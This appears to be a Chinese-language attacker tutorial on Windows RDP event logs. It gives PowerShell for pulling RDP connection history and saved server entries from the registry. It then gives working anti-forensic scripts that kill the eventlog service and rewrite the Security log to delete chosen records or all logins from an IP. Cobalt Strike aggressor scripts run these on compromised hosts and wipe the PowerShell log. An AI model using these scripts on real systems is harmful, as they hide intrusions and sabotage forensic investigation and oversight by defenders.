  * `LocalSessionManager` \- `EventID:24/25`
`wevtutil epl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational ./LocalSessionManager.evtx`
  * `ClientActiveXCore` \- `EventID:1024`
`wevtutil epl Microsoft-Windows-TerminalServices-RDPClient/Operational
./ClientActiveXCore.evtx`
### 1.2 登录失败
`EventID=4625`，分析语句 **同理** 登录成功
### 1.3 客户端主机名
注册表`HKEY_USERS\SID\Volatile Environment\X.CLIENTNAME`
`powershell`实现代码如下：
    function ClientHostName {
        $UserSID = dir "Registry::HKEY_USERS" -Name -ErrorAction Stop
        foreach($Name in $UserSID) {
            $RegPath = "Registry::HKEY_USERS\"+$Name+"\Volatile Environment\"
            Try {
                $Servers = dir $RegPath -Name -ErrorAction Stop
                foreach ($Server in $Servers) {
                    $ClientHostName = (Get-ItemProperty -Path $RegPath$Server -ErrorAction Stop).CLIENTNAME
                    Write-Host "[+] RegPath: "$RegPath$Server
                    Write-Host "[+] ClientHostName: "$ClientHostName
                }   
            }
            Catch {
                continue
            }
        }
    }
### 1.4 远程server
注册表`HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers\*`
其中， **保存凭据** 的单独显示
`powershell`实现代码如下：
    function RdpServer {
        $UserSID = dir "Registry::HKEY_USERS" -Name -ErrorAction Stop
        foreach($Name in $UserSID) {
            $RegPath = "Registry::HKEY_USERS\"+$Name+"\Software\Microsoft\Terminal Server Client\Servers\"
            Try {
                $Servers = dir $RegPath -Name -ErrorAction Stop
                foreach ($Server in $Servers) {
                    $UserName = (Get-ItemProperty -Path $RegPath$Server -ErrorAction Stop).UsernameHint
                    Write-Host "[+] Server: "$Server" UserName: "$UserName
                    $CertHash = (Get-ItemProperty -Path $RegPath$Server -ErrorAction Stop).CertHash
                    if($CertHash) {
                        Write-Host "[+] Server: "$Server" UserName: "$UserName" CertHash: "$CertHash 
                    }
                }
            }
            Catch {
                continue
            }
            $RegPathDefault = "Registry::HKEY_USERS\"+$Name+"\Software\Microsoft\Terminal Server Client\Default\"
            Try {
                $RegPathValues = Get-Item -Path $RegPathDefault -ErrorAction Stop
                foreach ($RegPathValue in $RegPathValues.Property ){
                    write-host "[+] Server:port > "$RegPathValues.GetValue($RegPathValue)
                }
            }
            Catch {
                continue
            }
        }
    }
### 1.5 日志量最大限制
注册表`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security`
    function ChangeSecurityMaxSize {
        $SecurityRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
        $SecurityRegValue = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).MaxSize
        write-host "Old Size: "+$SecurityRegValue
        Set-Itemproperty -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security' -Name 'MaxSize' -value '209715200'
        $SecurityRegValueCheck = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).MaxSize
        write-host "New Size: "+$SecurityRegValueCheck+'(200M)'
    }
### 1.6 RDP开放端口
查询注册表
    $RegPath = "Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
        $RDPportValue = (Get-ItemProperty -Path $RegPath -ErrorAction Stop).PortNumber
        write-host $RDPportValue
### 1.7 挂载驱动器监控
参考github：[DarkGuardian](https://github.com/FunnyWolf/DarkGuardian)
## 二：清除
**以下两种方式根据修改注册表实现**
以powershell为例：
**需要修改注册表**
`Set-Itemproperty -path
'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security'
-Name 'File' -value C:\Windows\System32\winevt\Logs\Security_new.evtx`
及
    tasklist /svc | findstr "eventlog"
    taskkill /F /PID 279
    net start eventlog
### 2.1 `EventRecordID`单条删除
单条日志清除
`wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx
/q:"*[System[(EventRecordID!=6810)]]" /ow:true`
### 2.2 `IpAddress`批量删除
源`ip`清除
`wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx
/q:"*[EventData[(Data[@Name='IpAddress']!='127.0.0.1')]]" /ow:true`
### 2.3 `powershell`示例
    [CmdletBinding()]
        Param (
            [string]$flagvalue,
            [string]$evtx = $pwd.Path
        )
        $SecurityRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
        $SecurityFileRegValueFileName = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).File
        $SecurityFileRegValueNew = $SecurityFileRegValueFileName.Replace("Security","Security_bak")
        $SecurityFileRegValueNewFlag = $SecurityFileRegValueFileName.Replace("Security","NewSecFlag")
        write-host $SecurityFileRegValueFileName
        # clear
        Try{
            wevtutil epl Security $SecurityFileRegValueNew /q:"*[System[(EventRecordID!="$flagvalue")]]" /ow:true
        }
        Catch {}
        Set-Itemproperty -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security' -Name 'File' -value $SecurityFileRegValueNewFlag
        $EventlogSvchost = tasklist /svc | findstr "eventlog" 
        $EventlogMatch = $EventlogSvchost -match "(\d+)"
        $EventlogSvchostPID = $Matches[0]
        # Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
        write-host $EventlogSvchostPID
        taskkill /F /PID $EventlogSvchostPID
        Try{
            Remove-Item $SecurityFileRegValueFileName -recurse
        }
        Catch {}
        Try{
            Remove-Item $SecurityFileRegValueNewFlag -recurse
        }
        Catch {}
        ren $SecurityFileRegValueNew $SecurityFileRegValueFileName
        Set-Itemproperty -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security' -Name 'File' -value $SecurityFileRegValueFileName
        net start eventlog
同理批量删除如下：
    # clear
        Try {
            wevtutil epl Security $SecurityFileRegValueNew /q:"*[EventData[(Data[@Name='IpAddress']!='')]]" /ow:true
        }
        Catch {}
## 三：脚本化
结合Cobalt Strike可实现自动化，具体可参考[cna脚本编写](https://www.cobaltstrike.com/aggressor-script/index.html)
### 3.1 取证示例
    item "RdpSuccessEvent" {
              local('$bid');
              foreach $bid ($1){
                  blog($1, "Get RDP Success Event (4624).");
                  bpowershell($bid,"wevtutil epl Security ./Sec.evtx");
                  bpowershell_import($bid, script_resource("./powershell/WinSuccEvent.ps1"));
                  bpowerpick($bid,"WinSuccEvent");
                  #bpowershell($bid,"WinSuccEvent");
                  brm($1,"Sec.evtx");
                  bpowershell($bid,"wevtutil cl \"Windows PowerShell\"");
              }
         }
### 3.2 清除示例
    item "IDEventClear" {
              prompt_text("Input Clear EventRecordID","1024",lambda({
                  blog(@ids,"Delete Security Event where EventRecordID = $1");
                  bpowershell_import(@ids, script_resource("./powershell/IDEventClear.ps1"));
                  bpowerpick(@ids,"IDEventClear $1");
                  bpowershell(@ids,"wevtutil cl \"Windows PowerShell\"");
              },@ids => $1));
         }
## 参考
  * [lostwolf](https://www.t00ls.net/thread-50632-1-1.html)
  * 
  * 
  * 